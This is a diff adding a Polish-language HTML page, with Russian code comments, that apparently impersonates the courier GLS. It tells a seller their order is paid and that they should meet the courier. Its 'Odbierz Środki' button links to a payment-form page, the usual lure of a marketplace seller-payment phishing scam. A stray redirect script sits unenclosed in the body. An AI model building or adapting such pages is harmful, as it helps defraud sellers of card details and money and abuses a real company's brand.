@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="pl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GLS Group - Status Zamówienia</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            color: #333;
+            background-color: #f4f4f4;
+        }
+
+        header {
+            background-color: #061ab1; /* Синий цвет верхней панели */
+            padding: 10px 15px; /* Отступы */
+            display: flex; /* Flexbox для выравнивания */
+            align-items: center; /* Центрирование по вертикали */
+            position: fixed; /* Фиксированное положение */
+            width: 100%; /* Ширина на 100% */
+            top: 0; /* Прижат к верхней части окна */
+            z-index: 1000; /* Поверх всего содержимого */
+            justify-content: space-between; /* Разделение элементов на края */
+            height: 80px; /* Фиксированная высота для синего фона */
+        }
+
+        .logo-container {
+            display: flex;
+            flex-direction: column; /* Вертикальное расположение логотипа */
+            align-items: center; /* Выравнивание по центру */
+            flex-grow: 1; /* Позволяет контейнеру занимать больше пространства */
+        }
+
+        header img {
+            width: 200px; /* Увеличенная ширина логотипа */
+        }
+
+        .side-image-left,
+        .side-image-right {
+            width: 80px; /* Ширина боковых изображений */
+            height: auto;
+        }
+
+        .side-image-right {
+            margin-right: 18px; /* Отступ справа для изображения */
+        }
+
+        .content-wrapper {
+            max-width: 1200px; 
+            margin: 90px auto 0; /* Отступ сверху для синей панели */
+            padding: 0; /* Убрать отступы */
+            text-align: center; 
+        }
+
+        .banner-image {
+            width: calc(100%); /* Ширина на 100% */
+            height: auto; 
+            aspect-ratio: 1 / 1; /* Квадратное соотношение сторон */
+            max-height: 75vh; /* Максимальная высота изображения */
+            object-fit: cover; /* Масштабировать изображение без искажения */
+            margin: 0; /* Убрать отступы */
+        }
+
+        h2 {
+            color: #007cc3;
+            margin: 20px 0;
+        }
+
+        .content p {
+            line-height: 1.6;
+            margin: 10px 0;
+            font-size: 16px;
+            color: #555;
+        }
+
+        .checklist {
+            margin: 20px 0;
+            padding: 0;
+            list-style: none;
+            text-align: left;
+        }
+
+        .checklist li {
+            margin: 10px 0;
+            padding: 10px;
+            background-color: #e9ecef;
+            border-left: 5px solid #061ab1;
+            border-radius: 5px;
+            display: flex;
+            align-items: center;
+        }
+
+        .checklist li img {
+            margin-right: 10px;
+        }
+
+        .cta {
+            text-align: center;
+            margin-top: 30px;
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 12px 25px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            text-decoration: none;
+            font-size: 18px;
+            transition: background-color 0.3s;
+        }
+
+        .btn:hover {
+            background-color: #218838;
+        }
+
+        footer {
+            background-color: #007cc3;
+            color: white;
+            text-align: center;
+            padding: 15px 0;
+            margin-top: 20px;
+        }
+
+        footer p {
+            margin: 5px 0;
+        }
+
+        /* Мобильные стили */
+        @media (max-width: 600px) {
+            .btn {
+                padding: 10px 20px;
+                font-size: 16px;
+            }
+
+            /* Убрал изменение для поля поиска */
+            header img {
+                width: 150px; /* Меняется для мобильных устройств, если нужно */
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <header>
+        <img src="https://i.ibb.co/cTLbdFN/IMG-4613.jpg" alt="Left Side Image" class="side-image-left">
+
+        <div class="logo-container">
+            <img src="https://i.ibb.co/XCWtdmt/IMG-4616.png" alt="GLS Logo">
+        </div>
+
+        <img src="https://i.ibb.co/RHf8Mz1/IMG-4621.jpg" alt="Right Side Image" class="side-image-right">
+    </header>
+
+    <div class="content-wrapper">
+
+        <img src="https://i.ibb.co/Z83xg6q/IMG-4612.jpg" alt="Загрузка" class="banner-image">
+
+        <h2>Twój zamówienie zostało opłacone</h2>
+        <p>Twoje zamówienie zostało pomyślnie opłacone! Przypisano mu numer śledzenia: <strong>#2652829</strong>.</p>
+
+        <h3>Co należy zrobić:</h3>
+        <ul class="checklist">
+            <li><img src="https://img.icons8.com/ios-filled/20/28a745/checkmark.png" alt="Check">Zdobądź pieniądze</li>
+            <li><img src="https://img.icons8.com/ios-filled/20/28a745/checkmark.png" alt="Check">Spotkanie z kurierem</li>
+            <li><img src="https://img.icons8.com/ios-filled/20/28a745/checkmark.png" alt="Check">Oddaj towar kurierowi</li>
+        </ul>
+
+        <h3>Jak zdobyć pieniądze?</h3>
+        <p>Naciśnij przycisk poniżej, aby otrzymać pieniądze za przedmiot</p>
+          
+
+        <div class="cta">
+            <a href="payment-form.html" class="btn">Odbierz Środki</a>
+        </div>
+      
+  <p>GLS 2024. Wszystkie prawa zastrzeżone.</p>
+
+	// Простой скрипт для обработки маршрутов на клиенте
+window.onload = function() {
+    const path = window.location.pathname; // Получаем текущий путь
+    if (path !== '/') { // Если путь не главная страница
+        window.location.replace('/'); // Перенаправляем на главную страницу
+    }
+};
+
+    </div>
+</html>
